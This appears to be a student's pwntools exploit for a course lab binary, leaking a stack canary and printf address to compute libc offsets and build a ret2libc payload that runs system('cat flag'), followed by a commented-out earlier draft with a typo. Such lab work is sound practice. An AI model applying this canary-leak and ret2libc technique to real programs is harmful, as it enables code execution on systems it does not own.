#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = '/home/student/handout/exercise4/exercise4a'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

'''
Issue: no code injection anymore! Time to exploit already provided code (code reuse)

Ideas:
- The handout states it is necessary to leverage libc. How can I use it? How I load it?
- Offset between functions in the executable constant => ELF()
Workflow:
- libc:
	- what does  pwntools says? 
	- Another way: >> ldd /handout/exercise4/exercise4a:
				linux-gate.so.1 (0xf7efe000)
				libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d04000)
				/lib/ld-linux.so.2 (0xf7f00000)
- Insights from Ghidra:
	-  Canary is present => leaak it --> sent sub-portion of buffer to leak them and addresses 
	- The buffer is of size 104
	- After analyzing the local variables and stack layout found that there is a 20+16 = 36 bytes padding before the return address
		- 16 --> 4 variables of length 4 before canary check
		- remaining 20bytes --> debug mode => leaked addresses + canary values (4 bytes)
	- calculate libc base address to get system and exit
	- craft and send final payload to make the program execute system('cat flag')
''' 

r = start()

BUFFER_SIZE = 104
LEAK_SIZE = 87 # from GDB

libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6')
elf = ELF(exe)

r.sendline(b'cat flag')
r.recvuntil(b'password:\n')
r.sendline(b'A'*LEAK_SIZE)

#print(r.recv())

response = r.recv()[103:123]

#print(response)

printf_address = response[:4]
cat_flag_address = response[12:16]
canary_values = response[16:]

#print(printf_address)
#print(cat_flag_address)
#print(canary_values)

system_address = (u32(printf_address) - libc.symbols['printf']) + libc.symbols['system']
exit_address = (u32(printf_address) - libc.symbols['printf']) + libc.symbols['exit']

payload = b'A'*BUFFER_SIZE + canary_values + b'A'*16 + p32(system_address) + p32(exit_address) + cat_flag_address

r.sendline(payload)

print(r.recvall())












'''
libc = ELF('/usr/lib/i386-linux-gnu/libc-2.31.so')
elf =  ELF(exe)

# from pwntools doc:
#bash = ELF(which('bash'))
#libc = bash.libc

r.sendline(b'cat flag')
r.recvuntil(b' password\n')
r.sendline(b'A'*87)
response = r.recv()

response = response[15+88:15+88+20]

printf_address = response[0:4]
cat_flag = response[-8:-4]
canary_values = response[-4:]

offset = u32(printf_address) - libc.symbols['printf']
system_address = offset + libc.symbols['system']
exit_address = offset + libc.symbols['exit']

payload = b'A'*104 + canary_values + b'A'*16 + p32(system_address) + p32(exit_address) + cat_flat

r.sendline(payload)
print(r.recvall())
'''























